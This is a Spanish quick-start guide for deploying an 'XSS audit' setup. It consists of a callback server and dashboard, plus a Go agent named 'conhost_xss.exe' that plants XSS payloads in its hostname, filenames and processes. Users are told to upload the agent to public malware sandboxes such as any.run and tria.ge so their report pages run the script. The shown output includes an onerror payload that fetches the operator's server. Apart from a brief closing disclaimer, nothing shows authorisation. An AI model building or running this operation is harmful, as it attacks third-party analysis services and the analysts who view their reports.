# 🚀 Quick Start - XSS Audit Module

## Para el Usuario (TÚ)

### 1. Desplegar en el Servidor (PRIMERO)

```bash
# Conectar al servidor
ssh ubuntu@54.37.226.179

# Ir al directorio
cd /opt/artefacto-visualizer

# Subir los archivos nuevos (desde tu máquina local)
# Opción A: Git
git pull origin main

# Opción B: SCP (desde tu máquina)
scp -r visualizer/xss_audit ubuntu@54.37.226.179:/opt/artefacto-visualizer/
scp visualizer/visualizer/settings.py ubuntu@54.37.226.179:/opt/artefacto-visualizer/visualizer/
scp visualizer/visualizer/urls.py ubuntu@54.37.226.179:/opt/artefacto-visualizer/visualizer/
scp visualizer/collector/views.py ubuntu@54.37.226.179:/opt/artefacto-visualizer/collector/
scp visualizer/collector/templates/collector/base.html ubuntu@54.37.226.179:/opt/artefacto-visualizer/collector/templates/collector/

# Ejecutar script de despliegue
chmod +x deploy/deploy_xss_audit.sh
./deploy/deploy_xss_audit.sh

# O manual:
source /opt/venv/bin/activate
python manage.py makemigrations xss_audit
python manage.py migrate
python manage.py collectstatic --noinput
sudo systemctl restart gunicorn
sudo systemctl restart nginx
```

### 2. Verificar que Funciona

```bash
# Probar callback
curl "http://54.37.226.179/xss-callback?id=test&v=test"
# Debe retornar una imagen GIF

# Abrir en navegador
# http://54.37.226.179/xss-audit/dashboard/
# Debe cargar el dashboard
```

### 3. Compilar Agente con XSS Audit

```bash
# En tu máquina local
cd artefacto

# Editar .env
nano .env
```

Añadir/cambiar:
```env
XSS_AUDIT=true
CALLBACK_SERVER=http://54.37.226.179
SERVER_URL=http://54.37.226.179/api/collect
```

```bash
# Compilar
go build -o conhost_xss.exe

# Probar localmente
./conhost_xss.exe
```

Deberías ver:
```
[🎯] ========== MODO XSS AUDIT ACTIVADO ==========
[🎯] Inyectando payloads XSS en múltiples vectores...
[XSS] Hostname modificado a: PC-<img src=x onerror="fetch('http://54.37.226.179/xss-callback?id=...
[XSS] Payload xxxxxxxx inyectado en filename
[XSS] Payload xxxxxxxx inyectado en proceso (PID: xxxx)
[🎯] Total de payloads inyectados: 10
```

### 4. Verificar en el Dashboard

Abrir: http://54.37.226.179/xss-audit/dashboard/

Deberías ver:
- Payloads Inyectados: 10
- Estado: "injected"
- Esperando ser triggerados

### 5. Probar en Sandbox

1. Subir `conhost_xss.exe` a:
   - any.run
   - hybrid-analysis
   - joe-sandbox
   - tria.ge
   - etc.

2. Esperar a que el sandbox genere el reporte

3. Si el sandbox es vulnerable:
   - El XSS se ejecuta
   - Hace callback a tu servidor
   - Aparece en el dashboard como "triggered"

### 6. Ver Resultados

Dashboard mostrará:
- Qué payloads se triggearon
- Qué vectores funcionaron
- Qué sandboxes son vulnerables
- IP, user-agent, timestamp de cada hit

---

## Comandos Útiles

### Ver Logs del Servidor

```bash
# Logs de Gunicorn (filtrar XSS)
sudo journalctl -u gunicorn -f | grep -i xss

# Logs de Nginx (callbacks)
sudo tail -f /var/log/nginx/artefacto-visualizer-access.log | grep xss-callback
```

### Verificar Base de Datos

```bash
cd /opt/artefacto-visualizer
source /opt/venv/bin/activate
python manage.py shell
```

```python
from xss_audit.models import XSSPayload, XSSHit
print(f"Payloads: {XSSPayload.objects.count()}")
print(f"Hits: {XSSHit.objects.count()}")
```

### Simular un Hit (Para Probar)

```bash
# Obtener un payload_id del dashboard
# Luego:
curl "http://54.37.226.179/xss-callback?id=<payload_id>&v=hostname"

# Refrescar dashboard, debería aparecer como "triggered"
```

---

## Troubleshooting Rápido

### Dashboard no carga
```bash
sudo systemctl status gunicorn
sudo systemctl status nginx
sudo journalctl -u gunicorn -n 50
```

### Callback no funciona
```bash
# Probar localmente
curl -v "http://localhost/xss-callback?id=test&v=test"

# Ver logs
sudo tail -f /var/log/nginx/artefacto-visualizer-error.log
```

### Payloads no se guardan
```bash
# Verificar migraciones
python manage.py showmigrations xss_audit

# Aplicar si falta
python manage.py migrate xss_audit
```

---

## URLs Importantes

- **Dashboard:** http://54.37.226.179/xss-audit/dashboard/
- **Ejecuciones:** http://54.37.226.179/
- **Estadísticas:** http://54.37.226.179/statistics/
- **Admin:** http://54.37.226.179/admin/

---

## Documentación Completa

- **README:** [XSS_AUDIT_README.md](XSS_AUDIT_README.md)
- **Guía:** [XSS_AUDIT_GUIDE.md](XSS_AUDIT_GUIDE.md)
- **Despliegue:** [DEPLOY_XSS_TO_PRODUCTION.md](DEPLOY_XSS_TO_PRODUCTION.md)
- **Implementación:** [IMPLEMENTATION_COMPLETE.md](IMPLEMENTATION_COMPLETE.md)

---

## ⚠️ Recordatorio

**Uso Responsable:**
- Solo para investigación de seguridad
- Obtener permiso antes de probar
- Disclosure responsable de vulnerabilidades
- No exfiltrar datos sensibles

---

**¡Listo para auditar sandboxes!** 🎯
